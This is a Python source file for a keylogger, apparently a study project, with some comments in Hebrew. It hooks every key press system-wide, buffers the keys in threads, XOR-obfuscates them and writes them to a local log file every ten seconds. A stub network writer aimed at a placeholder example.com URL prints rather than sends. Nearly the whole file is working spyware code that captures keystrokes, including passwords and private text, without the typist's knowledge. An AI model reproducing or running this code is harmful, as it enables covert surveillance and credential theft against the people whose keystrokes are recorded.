import time
import keyboard
import threading
import json
import base64
from abc import ABC, abstractmethod


# keylogger runtime
class KeyLoggerService:
    def __init__(self):
        self.buffer = []
        self.running = False
        self.lock = threading.Lock()  # 🔒 הוספנו מנעול למנוע קריסות

    # def start_listening(self):
    #     self.running = True  # Start listening
    #     while self.running:
    #         events = keyboard.record('enter')  # Record until "Enter" is pressed
    #         self.buffer.append(events)

    def start_listening(self):
        self.running = True
        keyboard.on_press(self.record_key)  # מאזין לכל מקש בזמן אמת

    def record_key(self, event):
        with self.lock:
            self.buffer.append(event.name)  # מוסיף את שם המקש שנלחץ

    #

    def stop_listening(self):
        self.running = False

    def get_buffer(self)->list:
        """:return: temporary listening data."""
        data = self.buffer.copy()
        self.buffer.clear()
        return data

# Encryptor (XOR)
class Encryptor:
    def __init__(self, key=5):
        self.key = key

    def encrypt(self, data):
        """Encrypt by XOR"""
        encrypted = ''.join(chr(ord(char) ^ self.key) for char in data)
        return encrypted

# Writer (Interface)
class Writer(ABC):
    @abstractmethod
    def write(self, data):
        pass

# Insert into file
class FileWriter(Writer):
    def __init__(self, filename="keylogger.txt"):
        self.filename = filename

    def write(self, data):
        with open(self.filename, "a") as file:
            file.write(data + "\n")

# Sending data to the server(API)
class NetworkWriter(Writer):
    def __init__(self, server_url="http://example.com/logs"):
        self.server_url = server_url

    def write(self, data):
        print(f"[Network] Sending to {self.server_url}: {data}")  #example server

# Manager
class KeyLoggerManager:
    def __init__(self, writers):
        self.key_logger_service = KeyLoggerService()
        self.encryptor = Encryptor() # Encryption
        self.writers = writers # File / Server
        self.running = False

    def run(self):
        """
        The function activates listening.
        :return: tuple (thread_1 - listener_thread, thread_2 - writer_thread)
         """
        self.running = True
        listener_thread = threading.Thread(target=self.key_logger_service.start_listening)
        writer_thread = threading.Thread(target=self.write_periodically, daemon=True)
        listener_thread.start()
        writer_thread.start()
        return listener_thread, writer_thread

    def stop(self):
        """ Stop listening """
        self.key_logger_service.stop_listening()
        self.running = False

    def write_periodically(self, interval=10):
        """ מבצע כתיבה כל X שניות """
        while self.running:
            time.sleep(interval)
            self.write_data()

    def write_data(self):
        """ אוסף נתונים, מצפין ושולח לכתיבה """
        data = self.key_logger_service.get_buffer()
        if data:
            encrypted_data = self.encryptor.encrypt(json.dumps(data))
            for writer in self.writers:
                writer.write(encrypted_data)


def main():

    file_writer = FileWriter()
    # network_writer = NetworkWriter()
    klm = KeyLoggerManager([file_writer])

    listener_thread, writer_thread = klm.run()


    time.sleep(30)
    klm.stop()


    listener_thread.join()
    writer_thread.join()

if __name__ == "__main__":
    main()

